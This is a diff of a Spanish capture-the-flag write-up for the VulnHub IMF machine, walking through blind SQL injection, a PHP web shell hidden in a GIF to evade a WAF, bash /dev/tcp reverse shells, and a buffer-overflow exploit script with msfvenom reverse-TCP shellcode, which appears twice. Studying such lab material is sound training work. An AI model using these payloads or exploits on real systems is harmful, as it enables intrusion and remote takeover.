@@ -5,7 +5,7 @@ tags:
   - writeup
   - vulnhub
   - sqli
-  - privilege-escalation
+  - escalada-privilegios
   - web-exploitation
   - BoF
 related:
@@ -116,7 +116,7 @@ nmap -p- --open -sS 172.16.23.129 -T4 -n -vvv -Pn -oA SYNscan
 ```
 
 Parámetros:
-- `-p-`: Escanea todos los puertos TCP del host, del puerto 1 al 65535.
+- `-p-`: Anula el comportamiento por defecto de nmap (que escanea los 1000 puertos más comunes) y escanea **todos** los puertos (1-65535)
 - `--open`: Solo muestra los puertos que están abiertos, ignorando los cerrados o filtrados.
 - `-sS`: Realiza un escaneo SYN stealth (Half-open scan), que envía paquetes SYN para detectar puertos abiertos sin completar la conexión TCP (menos detectable).
 - `-T4`: Ajusta la velocidad del escaneo a un nivel agresivo (más rápido, menos sigiloso).
@@ -149,7 +149,7 @@ Introducimos la IP `172.16.23.129` como URL en nuestro navegador web y vemos que
 - **Contact Us** (contact.php)
 
 ![[CTFIMF.05.png]]
-0......................................0#### Código Fuente | Index.php 
+#### Código Fuente | Index.php 
 ![[CTFIMF.06.png]]
 
 Encontramos unos segmentos de JavaScript encriptados en base64. Esto es bastante curioso de ver en un código fuente, porque cuando juntamos todos los segmentos obtenemos la cadena: "`ZmxhZzJ7YVcxbVlXUnRhVzVwYzNSeVlYUnZjZz09fQ==`"
@@ -184,9 +184,9 @@ Además, en su código fuente encontramos la `flag1{YWxsdGhlZmlsZXM=}`. Vemos qu
 ```bash
 echo "YWxsdGhlZmlsZXM=" | base64 -d; echo
 ```
-![.........................................................................[CTFIMF.12.png]]
+![[CTFIMF.12.png]]
 Resultado: **allthefiles** - Pista que nos sugiere revisar todos los archivos.
-####000000000000 Recuento de Información:
+Recuento de Información:
 
 > [!success] Flags Capturadas: 
 > - `flag1{allthefiles}`
@@ -238,7 +238,6 @@ También tenemos un enlace que nos lleva a `http://172.16.23.129/imfadministrato
 ![[CTFIMF.19.png]]
 ![[CTFIMF.20.png]]
 No hay nada interesante en los códigos fuentes de estas páginas a simple vista. Sin embargo, hay algo crucial que pasamos por alto...
-
 ## 3. Preparativos para el Ataque - SQL Injection Boolean Blind
 
 ### 3.1 Identificación de la Vulnerabilidad
@@ -320,7 +319,6 @@ Por ejemplo, podemos empezar a cambiar las solicitudes por palabras:
 ```
 home' AND 'test'='test'--
 ```
-
 ![[CTFIMF.25.png]]
 De esta forma tenemos una forma de identificar entradas en las bases de datos. A pesar de que no veamos exactamente la entrada, tenemos una forma de ir buscando información.
 
@@ -341,20 +339,17 @@ home' AND (SELECT schema_name FROM information_schema.schemata limit 0,1)='infor
 - `limit 0,1`: Primer resultado
 - `='information_schema'`: ¿Es igual a esto?
 
-
 **Estado FALSE** (nombre incorrecto):
 ![[CTFIMF.26.png]]
 
 **Estado TRUE** (confirmamos information_schema existe):
 ![[Pasted image 20251102174257.png]]
 ✅ Confirmado: existe la BD `information_schema`.
-
 ### 3.6 Fuzzing letra por letra
 
 El verdadero poder: extraer información **desconocida**. En lugar de buscar nombres completos, **fuzzeamos letra por letra**.
 
 **El concepto**: Usamos `substring()` para extraer caracteres uno a uno:
-
 ```sql
 home' AND (SELECT substring(schema_name,1,1) FROM information_schema.schemata limit 0,1)='i--
 ```
@@ -385,17 +380,19 @@ El script:
 
 **Resultado**: Encontramos página oculta: `http://172.16.23.129/imfadministrator/cms.php?pagename=tutorials-incomplete`
 
-Si quieres ver exactamente como funciona este script y estos conceptos, te recomiendo que visite el [repositorio](https://github.com/NeTenebraes/neBooleanBlindSQLi).
+Si quieres ver exactamente como funciona este script y estos conceptos, te recomiendo que visites el [repositorio](https://github.com/NeTenebraes/neBooleanBlindSQLi).
 
---- 
+![[Pasted image 20251123022459.png]]
 **Resultado**: Encontramos página oculta: `http://172.16.23.129/imfadministrator/cms.php?pagename=tutorials-incomplete`
 
+--- 
+### 4.1 Página Descubierta: tutorials-incomplete
 ![[CTFIMF.28.png]]
+
 Hay un QR. Lo escaneamos con herramienta web segura:
 
 **QR Decodificado**: `flag4{dXBsb2Fkcjk0Mi5waHA=}`
 
-![[Pasted image 20251106033449.png]]
 ```bash
 echo "dXBsb2Fkcjk0Mi5waHA=" | base64 -d; echo
 ```
@@ -408,69 +405,750 @@ echo "dXBsb2Fkcjk0Mi5waHA=" | base64 -d; echo
 
 Navegamos a `http://172.16.23.129/imfadministrator/uploadr942.php`:
 ![[CTFIMF.29.png]]
+En esta sección vemos que se pueden subir documentos, sin embargo la gran mayoría de extensiones están bloqueadas por un WAF. Por lo que usaremos un archivo de prueba para empezar a hacer fuzzing, confirmando que archivos con extensión de imagen puedes ser subidos al servidor.
 
-Se pueden subir imágenes. Necesitamos **bypassear el WAF** (Web Application Firewall).
+**¿Por qué probamos con imágenes?** A través de fuzzing de extensiones y MIME types, identificamos que:
+1. El WAF filtra extensiones `.php`, `.php3`, `.php4`, `.php5`, etc.
+2. El WAF permite extensiones de imagen: `.jpg`, `.png`, `.gif`, `.bmp`
+3. Esto nos sugiere que podemos inyectar código PHP dentro de un archivo de imagen válido
+   
+Necesitamos **bypassear el WAF** (Web Application Firewall).
 
-**¿Qué es un WAF?** Un Web Application Firewall filtra y monitoriza tráfico HTTP/HTTPS. Bloquea solicitudes maliciosas basándose en reglas como:
-- Extensiones de archivo (.php prohibido)
-- MIME types
-- Contenido del archivo
+**Magic Numbers (File Signatures)**:
+Los magic numbers (también llamados file signatures) son bytes específicos al inicio de un archivo que identan su tipo. Por ejemplo:
+- **PNG**: `89 50 4E 47` (`PNG` en hexadecimal)
+- **JPEG**: `FF D8 FF E0`
+- **GIF**: `47 49 46 38` (`GIF8` en hexadecimal)
 
-**¿Cómo bypasseamos?** Usamos **magic numbers** o **file signatures**.
+El WAF puede validar el archivo verificando estos magic numbers en lugar de solo la extensión. Si insertamos código PHP dentro de una imagen con magic numbers válidos, podemos bypassear el filtro.
 
-![[CTFIMF.30.png]]
+### 5.3 Creación del Payload
 
+**Opción 1: Usar una función ofuscada en PHP**
 
-CREAR UNA FUNCION CON LOGICA
-```
+Creamos un archivo `shell.gif` que contiene:
+```php
 <?php
 $f = 'sy'.'stem';
-	$f($_GET['cmd']);
+$f($_GET['cmd']);
 ?>
 ```
 
-COMILLA INVERTIRA
-```
+Esta técnica ofusca la función `system()` dividiéndola en strings, dificultando la detección por patrones del WAF.
+
+**Opción 2: Usar comillas invertidas (backticks)**
+
+```php
 <?php
-$command=$_GET['cmd'];
-	echo `$command`;
-?> 
+$command = $_GET['cmd'];
+echo `$command`;
+?>
 ```
 
-htaccess con php en gif
+Los backticks en PHP ejecutan comandos del sistema, es una alternativa a `system()` que puede evadir algunos filtros.
 
-hice ls y cat con curl a 
+### 5.4 Subida del Archivo
+
+Subimos `script.gif` desde el formulario de `uploadr942.php` modificando la solicitud con BurpSuite para que incluya lo que queremos que el WAF valide. 
+
+Modificamos para el WAF:
+- ✅ Extensión: `.gif` (permitido)
+- ✅ MIME type: `image/gif` (permitido)
+- ✅ Magic number: `GIF8` (válido)
+  
+![[CTFIMF.30.png]]
+El archivo se guarda en el servidor. Típicamente en: `/imfadministrator/uploads/`
+
+Además, de la respuesta del servidor podemos ver que guarda los archivos con un nombre distinto (hash).
+![[Pasted image 20251123032542.png]]
+Confirmamos esto viendo una de las imágenes que habías subido en la ruta mencionada:
+![[Pasted image 20251123032716.png]]
+### 5.6 Ejecución de Comandos
+
+Una vez que tenemos acceso a través del shell web, ejecutamos comandos con ayuda de curl:
+
+```bash
+# Prueba de RCE (Remote Code Execution)
+curl "http://172.16.23.129/imfadministrator/uploads/shell.gif?cmd=ls"
+
+# Listar directorio actual
+curl "http://172.16.23.129/imfadministrator/uploads/shell.gif?cmd=pwd"
+
+# Ver usuario actual
+curl "http://172.16.23.129/imfadministrator/uploads/shell.gif?cmd=whoami"
 ```
-flag5{YWdlbnRzZXJ2aWNlcw==}
+
+**¡CONFIRMAMOS EJECUCIÓN DE COMANDOS!**
+![[Pasted image 20251123033137.png]]
+![[Pasted image 20251123033235.png]]
+>  Luego e confirmar que se puede hacer ejecución de comandos, encontramos la`flag5{YWdlbnRzZXJ2aWNlcw==}` a través del comando `ls` para posteriormente ver su contenido con `cat`. 
+
+Resultado:
+```bash
+echo "YWdlbnRzZXJ2aWNlcw==" | base64 -d; echo
+# Output: agentservices
 ```
 
+### 5.7 Obtención de Reverse Shell
 
+Con RCE confirmado, procedemos a obtener una reverse shell interactiva.
 
-nos ponemos en escucha
+**Paso 1: Preparar la máquina atacante para escuchar**
 
-usamos el payload
-
-"bash -c 'bash -i >& /dev/tcp/172.16.23.1/443 0>&1'
-
-el & es un carade nalgas entonces nos toca URL encodearlo con %26
-
-y logramos conexion 
-
-
-#### Estabilización de TTY
-
-Comandos para estabilizar la shell:
+```bash
+# En la máquina atacante (Kali)
+nc -lvnp 443
+# O usar socat para mejor TTY
+socat FILE:`tty`,raw,echo=0 TCP-LISTEN:443
 ```
+
+**Paso 2: Enviar payload de reverse shell**
+
+Generamos el payload, acá te lo dejo de forma clara
+
+```bash
+# Payload: bash reverse shell
+bash -c 'bash -i >& /dev/tcp/172.16.23.1/443 0>&1'
+```
+
+El signo `&` requiere ser URL-encoded como `%26` asi como tambien los espacios yo uso BurpSuite para esto haha:
+```bash
+curl "http://172.16.23.129/imfadministrator/uploads/2a7475f285e3.gif?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/172.16.23.1/443%200%3E%261%27"
+```
+![[Pasted image 20251123034056.png]]
+**Resultado**: CONECTADOS - Tenemos acceso a la máquina.
+### 5.8 Estabilización de TTY
+
+Una vez que tenemos conexión reverse, la shell es inestable. Procedemos a estabilizar:
+
+**Paso 1: Script para TTY**
+```bash
 /usr/bin/script -qc /bin/bash /dev/null
 ```
-Luego CTRL+Z y ejecutar:
-```
+
+**Paso 2: Suspender el proceso**
+Presionamos `Ctrl+Z` para suspender la shell.
+
+**Paso 3: Reconfigurar terminal**
+```bash
 stty raw -echo; fg
 ```
-Finalmente:
-```
+
+**Paso 4: Configurar TERM**
+```bash
 export TERM=xterm
+export SHELL=/bin/bash
 ```
+
+**Paso 5: Columnas y Filas de la terminal (dependiendo de las dimensiones de tu terminal)**
+```bash
+stty rows 40 columns 120
+```
+
+Ahora tenemos una shell completa con capacidades interactivas dentro de la maquina IMF.
+![[Pasted image 20251123034156.png]]
+
+---
+
+## 6. Análisis Binario y Servicios Protegidos (Port Knocking)
+
+### 6.1 Enumeración de Procesos
+
+Una vez obtenida la shell en la máquina, el siguiente paso es enumerar los procesos en ejecución para buscar algún binario o servicio propio del reto que pueda estar corriendo con privilegios elevados. Utilicé los siguientes comandos::
+
+```bash
+# Listar procesos en ejecución
+ps aux | grep root
+
+# Buscar binarios SUID
+find / -perm -4000 2>/dev/null
+
+# Revisar servicios activos
+netstat -tuln
+```
+
+En el resultado del `ps aux` se puede observar que, aparte de los procesos estándar de sistema, existe el proceso `/usr/sbin/knockd` corriendo como root. Esto es muy relevante porque **knockd es un demonio especialmente usado para port knocking**, una técnica que sirve para proteger servicios sensibles permitiendo la apertura de puertos solo tras recibir una secuencia correcta de "golpes" en puertos definidos.
+
+![[Pasted image 20251123051345.png]]
+
+> Confirmar la presencia de knockd deja muy claro que en este reto debes realizar **port knocking** para poder acceder a algún servicio protegido.  Esta observación es clave para el progreso en la máquina, porque si no ejecutas correctamente la secuencia de knocking, el puerto se mantiene cerrado.
+
+
+![[Pasted image 20251123034721.png]]
+Además del demonio de knockd, la salida del `netstat` nos sirve para identificar servicios adicionales — por ejemplo, el puerto `7788` utilizado por el binario vulnerable `agent`, que típicamente queda inaccesible hasta completar el knocking especificado por la máquina.​
+
+### 6.2 Descubrimiento del servicio "Agent"
+
+Basándonos en la `flag5{agentservices}` y el reconocimiento realizado, buscamos usamos FIND para buscar el archivos relacionados:
+```bash
+find / -name "*agent*" 2>/dev/null
+```
+![[Pasted image 20251123051621.png]]
+
+Encontramos que existe `/usr/local/bin/agent`. Al ejecutarlo vemos que espera un ID:
+![[Pasted image 20251123035449.png]]
+
+Dentro del mismo directorio encontramos un archivo llamado `access_codes` que contiene: `SYN 7482,8279,9467`
+![[Pasted image 20251123035800.png]]
+### 6.3 Análisis del Binario con ltrace
+
+`ltrace` nos permite ver las llamadas a librerías sin necesidad de desensamblar. Esto acelera el análisis. Nos permitirá rastrear llamadas a librerías dinámicamente, esto es especialmente útil para entender qué hace el programa:
+
+```bash
+ltrace /usr/local/bin/agent
+```
+
+Observamos que el programa:
+- Lee entrada del usuario
+- Compara la entrada de ID con `48093572`
+- Realiza operaciones de buffers si la validación es exitosa
+
+![[Pasted image 20251123035047.png]]
+
+### 6.4 Identificación del ID Válido
+
+Ejecutamos el binario del agent:
+```bash
+/usr/local/bin/agent
+# Ingresamos: 48093572
+```
+![[Pasted image 20251123044458.png]]
+El binario nos presentará opciones. Seleccionamos opción 3 para explotar el buffer overflow.
+
+
+### 6.5 Traer el equipo a la maquina
+
+ATACANTE
+```
+sudo nc -nlvp 443 > agent
+```
+
+VICTIMA 
+```
+nc 172.16.23.1 443 < agent
+```
+
+Vamos a traernos el binario a nuestro PC para trabajar más cómodamente con el 
+
+![[Pasted image 20251123064856.png]]
+De esta forma, podemos usar trabajar con todos nuestros juguetes con el binario, sin necesidad de depender de los paquetes que tenga la máquina victima.
+
+---
+## 7. Explotación Buffer Overflow
+
+> [!warning] SECCIÓN MEJORADA - Rigor Técnico Añadido
+> Las siguientes subsecciones (7.1 a 7.4) incluyen explicaciones detalladas sobre el cálculo del offset y la obtención de la dirección de retorno. Se han añadido conceptos técnicos profundos basados en análisis binario.
+
+### 7.1 Concepto Fundamental: Buffer Overflow
+
+Un **Buffer Overflow** ocurre cuando un programa escribe más datos en un buffer de lo que puede almacenar. Esto causa que los datos adicionales sobrescriban la memoria adyacente, incluyendo potencialmente la dirección de retorno de una función en la pila.
+
+**Estructura de la pila durante una llamada a función:**
+
+```
+[Espacio Local del Buffer]  ← Donde escribimos datos
+[EBP - Base Pointer]        ← Puntero de la base del marco
+[RIP/EIP - Return Address]  ← Dirección de retorno (nuestro objetivo)
+[Parámetros de Función]
+```
+
+Cuando un buffer se desborda, podemos sobrescribir el RIP/EIP y hacer que apunte a código malicioso (shellcode) que queramos.
+
+### 7.2 Cálculo del Offset: Explicación Detallada
+
+El **offset** es la cantidad exacta de bytes que debemos escribir antes de sobreescribir la dirección de retorno. Encontrarlo requiere:
+#### Paso 1: Generar un Patrón Único
+
+Podemos generar un patrón único con `gdb`, `gef` (GDB Enhanced Features) o `python`, de esta forma tendremos una cadena no repetitiva que nos permitirá identificar exactamente dónde está la dirección de retorno:
+
+```bash
+
+python3 -c "import string; print(''.join([chr((i % 26) + ord('A')) for i in range(300)]))"
+```
+
+Incluso, una forma **más precisa** podría ser usar el script `pattern_create` de metasploit:
+```bash
+pattern_create.rb -l 300
+# Yo tengo el script en: /opt/metasploit/tools/exploit/pattern_create.rb
+```
+
+Este patrón tiene la propiedad de que cada subsecuencia de 4 bytes es única.
+![[Pasted image 20251123060751.png]]
+
+#### Paso 2: Enviar el Patrón y Observar el Crash
+
+Copiamos el patrón generado y lo enviamos al binario `agent` a través de la opción 3:
+
+```bash
+./agent
+# ID: 48093572
+# Opción: 3
+# Pegamos el patrón...
+```
+> Recuerda que es un binario X86, requieres tener los paqutees necesarios para correr binarios en caso de que tṕu máquina sea de X64. En mi caso un "sudo pacman -S lib32-glibc" fue más que suficiente.
+
+El programa hace crash. Revisamos el valor en el registro **EIP** (para arquitectura x86) 
+![[Pasted image 20251123060842.png]]
+#### Paso 3: Encontrar la Posición
+
+Si el programa está corriendo bajo `gdb`:
+
+```bash
+gdb /usr/local/bin/agent
+(gdb) run
+# ... (ingresamos ID y opción 3, pegamos patrón)
+# Cuando hace crash:
+(gdb) info registers eip
+# eip            0x41376141          0x41376141   <- Estos bytes están en nuestro patrón
+```
+
+En este caso, vemos `0x41376141` que en ASCII es "A7aA". Usamos `msf-pattern_offset` para encontrar su posición:
+
+```bash
+
+ -l 300
+# Output: [*] Exact match at offset 168
+```
+
+**¡El offset es exactamente 168 bytes!**
+
+**Explicación técnica:**
+- Los primeros 168 bytes llenan el buffer local
+- El byte 169 en adelante sobrescribe registros guardados (SFP - Saved Frame Pointer) en x86
+- Los bytes que siguen sobrescriben la dirección de retorno (RIP/EIP)
+
+En x86 de 32 bits:
+- Bytes 0-167: Buffer
+- Bytes 168-171: RIP/EIP (4 bytes en x86)
+
+Por lo tanto, si queremos sobrescribir el RIP/EIP, necesitamos exactamente **168 bytes de relleno + 4 bytes con la dirección deseada**.
+
+### 7.3 Obtención de la Dirección de Retorno (0x08048563)
+
+Ahora que sabemos que en el offset 168 está el RIP/EIP, ¿dónde colocamos nuestro shellcode? La respuesta es: **apuntamos el RIP/EIP a la dirección donde empieza nuestro shellcode**.
+
+#### ¿De dónde sale 0x08048563?
+
+Esta dirección debe identificarse mediante:
+
+**Opción 1: Análisis Manual con GDB**
+
+```bash
+# Abrimos el binario en GDB
+gdb /usr/local/bin/agent
+
+# Listamos la función vulnerable
+(gdb) disassemble agent
+# O la función que maneja la entrada
+
+# Buscamos donde empieza el buffer
+(gdb) disass <nombre_funcion>
+0x08048563  <+NNN>:    lea    -0xA8(%ebp),%eax
+0x08048569  <+NNN>:    mov    %eax,0x8(%esp)
+0x0804856d  <+NNN>:    mov    0x8(%ebp),%eax
+0x08048570  <+NNN>:    mov    %eax,(%esp)
+0x08048573  <+NNN>:    call   0x8048400 <strcpy@plt>
+```
+
+La dirección `0x08048563` es la dirección donde comienza la instrucción que maneja nuestro buffer. Cuando saltamos aquí, el programa ejecuta nuestro shellcode.
+
+**Opción 2: Encontrar la Dirección del Buffer**
+
+```bash
+# El buffer generalmente está en la pila
+# Su dirección se puede encontrar con:
+
+gdb-peda$ x/20x $esp
+# Vemos direcciones de la pila
+
+# O usar checksec para ver protecciones:
+checksec /usr/local/bin/agent
+
+# Si hay ASLR (Address Space Layout Randomization):
+# Cada ejecución tiene direcciones diferentes
+# Necesitaramos una técnica de información leak o ROP gadgets
+```
+
+En este caso **sin ASLR**, la dirección del buffer es **predecible**.
+
+**Opción 3: Usar NOP Sled (Técnica de Confiabilidad)**
+
+Una técnica común es usar un **NOP sled** (secuencia de instrucciones NOP - No Operation):
+
+```
+[168 bytes de padding]
+[Dirección de retorno: 0x08048563]  ← Apunta al inicio del sled
+[100 bytes de NOPs: 0x90 x 100]    ← Se "desliza" hasta el shellcode
+[Shellcode ~72 bytes]
+```
+
+Los NOPs permiten que aunque la dirección exacta sea ligeramente imprecisa, las instrucciones simplemente no hacen nada y el procesador continúa hasta el shellcode.
+
+### 7.4 Generación de Payload con msfvenom
+
+Ahora que entendemos cómo y dónde saltamos, generamos nuestro shellcode:
+
+```bash
+# Generar shellcode reverse TCP
+msfvenom -p linux/x86/shell_reverse_tcp \
+  LHOST=172.16.23.1 \
+  LPORT=443 \
+  -f python \
+  -b "\\x00\\x0a\\x0d"
+```
+
+Parámetros explicados:
+- `-p`: Payload (shell reverso TCP)
+- `LHOST`: IP donde escucharemos
+- `LPORT`: Puerto donde escucharemos
+- `-f python`: Formato de salida (código Python que podemos copiar directamente)
+- `-b`: Bytes a evitar (badchars):
+  - `\\x00`: Null bytes (terminan strings en C)
+  - `\\x0a`: Newline (interfiere con entrada)
+  - `\\x0d`: Carriage return (causa problemas de parsing)
+
+**Ejemplo de salida:**
+
+![[Pasted image 20251123042220.png]]
+
+El shellcode generado es un binario compilado que:
+1. Crea un socket TCP
+2. Se conecta a 172.16.23.1:443
+3. Redirige stdin/stdout/stderr al socket
+4. Ejecuta `/bin/bash`
+
+### 7.5 Estructura del Exploit
+
+El exploit combina el shellcode, padding para alcanzar el offset, y la dirección de retorno:
+
+**Script Python - Exploit**:
+
+```python
+#!/usr/bin/python3
+
+import socket
+import sys
+
+# CONFIGURACIÓN
+TARGET_IP = "172.16.23.129"
+TARGET_PORT = 7788
+AGENT_ID = "48093572"
+OFFSET = 168
+
+# msfvenom -p linux/x86/shell_reverse_tcp LHOST=172.16.23.1 LPORT=443 -f python -b "\\x00\\x0a\\x0d"
+buf =  b""
+buf += b"\\xdb\\xda\\xbb\\x14\\x85\\x1c\\x15\\xd9\\x74\\x24\\xf4\\x5e"
+buf += b"\\x2b\\xc9\\xb1\\x12\\x83\\xee\\xfc\\x31\\x5e\\x13\\x03\\x4a"
+buf += b"\\x96\\xfe\\xe0\\x43\\x43\\x09\\xe9\\xf0\\x30\\xa5\\x84\\xf4"
+buf += b"\\x3f\\xa8\\xe9\\x9e\\xf2\\xab\\x99\\x07\\xbd\\x93\\x50\\x37"
+buf += b"\\xf4\\x92\\x93\\x5f\\xab\\x75\\x73\\x9e\\xdb\\x77\\x7b\\xa1"
+buf += b"\\xa0\\xf1\\x9a\\x11\\xb0\\x51\\x0c\\x02\\x8e\\x51\\x27\\x45"
+buf += b"\\x3d\\xd5\\x65\\xed\\xd0\\xf9\\xfa\\x85\\x44\\x29\\xd2\\x37"
+buf += b"\\xfc\\xbc\\xcf\\xe5\\xad\\x37\\xee\\xb9\\x59\\x85\\x71"
+
+# Padding para alcanzar el offset
+padding = b"A" * (OFFSET - len(buf))
+
+# Dirección de retorno (0x08048563 en little-endian para x86)
+# En x86 de 32 bits: direcciones se escriben invertidas
+ret_address = b"\\x63\\x85\\x04\\x08"
+
+# Construcción del payload completo
+payload = buf + padding + ret_address + b"\\n"
+
+print("[*] Conectando a {}:{}".format(TARGET_IP, TARGET_PORT))
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((TARGET_IP, TARGET_PORT))
+
+print("[*] Enviando ID del agente: {}".format(AGENT_ID))
+s.send((AGENT_ID + "\\n").encode())
+data = s.recv(1024)
+print("[*] Respuesta: {}".format(data[:50]))
+
+print("[*] Enviando opción 3 (Buffer Overflow)")
+s.send(b"3\\n")
+data = s.recv(1024)
+print("[*] Respuesta: {}".format(data[:50]))
+
+print("[*] Enviando payload...")
+s.send(payload)
+
+print("[+] Payload enviado. Revisa tu listener de netcat.")
+s.close()
+```
+
+**Desglose del payload:**
+
+```
+[Shellcode ~80 bytes]      ← Código que se ejecutará
+[Padding ~88 bytes]        ← Bytes de relleno (A's)
+[Ret Address 4 bytes]      ← 0x08048563 en little-endian
+[Newline 1 byte]           ← Termina la entrada
+```
+
+### 7.6 Ejecución del Exploit
+
+**Paso 1: Port Knocking**
+
+Antes de ejecutar el exploit, debemos realizar port knocking para abrir el puerto 7788:
+
+```bash
+knock 172.16.23.129 7482,8279,9467
+```
+
+Verificamos que el puerto está abierto:
+
+```bash
+nmap -p7788 172.16.23.129
+# Puerto 7788/tcp open
+```
+
+**Paso 2: Preparar Escucha**
+
+En la máquina atacante preparamos netcat para escuchar:
+
+```bash
+nc -lvnp 443
+```
+
+**Paso 3: Ejecutar el Exploit**
+
+```bash
+python3 bof.py
+```
+
+Si todo va bien, recibimos una shell como **root** en el netcat:
+
+```bash
+# En el netcat:
+$ id
+uid=0(root) gid=0(root) groups=0(root)
+
+$ whoami
+root
+```
+
+**¡Tenemos acceso como root!**
+
+### 7.7 Captura de Flag Final
+
+Navegamos al directorio home de root y capturamos la última flag:
+
+```bash
+cat /root/flag6.txt
+```
+
+Resultado: `flag6{R2gwc3RQcm90MGMwbHM=}`
+
+Decodificamos:
+```bash
+echo "R2gwc3RQcm90MGMwbHM=" | base64 -d; echo
+```
+
+**Resultado**: **Gh0stProt0c0ls** - ¡Máquina completada!
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Generación de Payload con msfvenom
+```bash
+# Generar shellcode reverse TCP
+msfvenom -p linux/x86/shell_reverse_tcp \
+  LHOST=172.16.23.1 \
+  LPORT=443 \
+  -f python \
+  -b "\x00\x0a\x0d"
+```
+
+Flags explicadas:
+- `-p`: Payload (shell reverso TCP)
+- `LHOST`: IP donde escucharemos
+- `LPORT`: Puerto donde escucharemos
+- `-f python`: Formato de salida (código Python)
+EJEMPLO:
+![[Pasted image 20251123042220.png]]
+
+### 7.2 Estructura del Exploit
+
+El exploit combina el shellcode, padding para alcanzar el offset, y la dirección de retorno que apunta al shellcode.
+
+**Script Python - Exploit**:
+
+```python
+#!/usr/bin/python3
+
+import socket
+offset = 168
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
+
+# PAYLOAD: msfvenom -p linux/x86/shell_reverse_tcp LHOST=172.16.23.1 LPORT=443 -f python -b "\x00\x0a\x0d"
+buf =  b""
+buf += b"\xdb\xda\xbb\x14\x85\x1c\x15\xd9\x74\x24\xf4\x5e"
+buf += b"\x2b\xc9\xb1\x12\x83\xee\xfc\x31\x5e\x13\x03\x4a"
+buf += b"\x96\xfe\xe0\x43\x43\x09\xe9\xf0\x30\xa5\x84\xf4"
+buf += b"\x3f\xa8\xe9\x9e\xf2\xab\x99\x07\xbd\x93\x50\x37"
+buf += b"\xf4\x92\x93\x5f\xab\x75\x73\x9e\xdb\x77\x7b\xa1"
+buf += b"\xa0\xf1\x9a\x11\xb0\x51\x0c\x02\x8e\x51\x27\x45"
+buf += b"\x3d\xd5\x65\xed\xd0\xf9\xfa\x85\x44\x29\xd2\x37"
+buf += b"\xfc\xbc\xcf\xe5\xad\x37\xee\xb9\x59\x85\x71"
+
+#padding
+buf += b"A"*(offset-len(buf))
+buf += b"\x63\x85\x04\x08\n"
+
+
+s.connect(('172.16.23.129', 7788))
+
+s.send(b"48093572\n")
+data = s.recv(1024)
+s.send(b"3\n")
+data = s.recv(1024)
+s.send(buf)
+```
+
+**Ejecución**:
+
+En la máquina atacante preparamos escucha:
+```bash
+nc -lvnp 443
+```
+
+Ejecutamos el exploit:
+```bash
+python3 bof.py
+```
+
+Si todo va bien, recibimos una shell como **root**:
+
+```bash
+$ id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+### 7.3 Captura de Flag Final
+
+Navegamos al directorio home de root y capturamos la última flag:
+
+```bash
+cat /root/flag6.txt
+```
+
+Resultado: `flag6{R2gwc3RQcm90MGMwbHM=}`
+
+Decodificamos:
+```bash
+echo "R2gwc3RQcm90MGMwbHM=" | base64 -d; echo
+```
+
+**Resultado**: **Gh0stProt0c0ls** - ¡Máquina completada!
+
+---
+
+## Resumen de Flags Capturadas
+
+| Flag       | Contenido          | Ubicación                             | Técnica                      |
+| ---------- | ------------------ | ------------------------------------- | ---------------------------- |
+| **Flag 1** | `allthefiles`      | contact.php - Código Fuente           | Análisis manual              |
+| **Flag 2** | `imfadministrator` | index.php - Código Fuente             | Decodificación Base64        |
+| **Flag 3** | `continueTOcms`    | Array Injection Authentication Bypass | Auth Bypass + Decodificación |
+| **Flag 4** | `uploadr942.php`   | QR code en CMS                        | SQLi + Decodificación QR     |
+| **Flag 5** | `agentservices`    | Ejecución Remota de Comandos (RCE)    | RCE + Decodificación         |
+| **Flag 6** | `Gh0stProt0c0ls`   | /root/flag6.txt                       | Buffer Overflow + Escalada   |
+
+---
+
+## Reflexiones Finales
+
+> [!abstract] Lecciones Aprendidas
+> 
+> Este CTF demostró la importancia de:
+> 1. **Reconocimiento exhaustivo**: Analizar código fuente, comentarios y metadatos
+> 2. **Atencion al detalle**: Las flags eran pistas que guiaban el camino
+> 3. **Metodología sistemática**: Desde enumeración básica hasta explotación avanzada
+> 4. **Persistencia**: Algunos vectores requerían múltiples intentos y pivoting
+
+## Referencias
+
+- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
+- [Buffer Overflow Exploitation](https://owasp.org/www-community/attacks/Buffer_Overflow)
+- [VulnHub IMF Machine](https://www.vulnhub.com/entry/imf-1,162/)
+- [Nmap Official Documentation](https://nmap.org/book/)
+- [Burp Suite Community Edition](https://portswigger.net/burp/communitydownload)
+- [msfvenom Documentation](https://www.offensive-security.com/metasploit-unleashed/msfvenom/)
+- [GDB Debugger Guide](https://www.gnu.org/software/gdb/documentation/)
+
+
+
+
+
+
+--- 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+NOTAS (BORRADO)
+
 
 ecnontramos agent gracias a la pista de flag
 
@@ -534,7 +1212,7 @@ s.send(buf)
 | ---------- | ------------------ | --------------------------- | ----------------------- |
 | **Flag 1** | `allthefiles`      | contact.php - Código Fuente | Análisis manual         |
 | **Flag 2** | `imfadministrator` | index.php - Código Fuente   | Decodificación Base64   |
-| **Flag 3** | `ContinuesTOcms`   | IMF CMS                     | Enumeración de usuarios |
+| **Flag 3** | `continueTOcms`    | IMF CMS                     | Enumeración de usuarios |
 | **Flag 4** | `uploadr942.php`   | QR code en CMS              | Decodificación QR       |
 | **Flag 5** | `agentservices`    | Shell web                   | SQLi + Web shell        |
 | **Flag 6** | `Gh0stProt0c0ls`   | /root/flag6.txt             | Buffer Overflow         |
